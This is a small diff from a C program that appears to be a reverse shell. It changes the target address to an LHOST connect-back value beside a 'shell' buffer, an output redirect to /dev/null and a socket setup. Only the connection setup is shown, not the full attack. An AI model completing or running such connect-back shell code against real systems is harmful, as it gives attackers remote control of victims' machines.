@@ -19,7 +19,7 @@ char shell[10000];
 char redirect[100] = " >/dev/null 2>&1";
 
 int main(){
-  char ip[] = target;
+  char ip[] = LHOST;
   int port = PORT;
 
   fd = socket(AF_INET, SOCK_STREAM, 0);
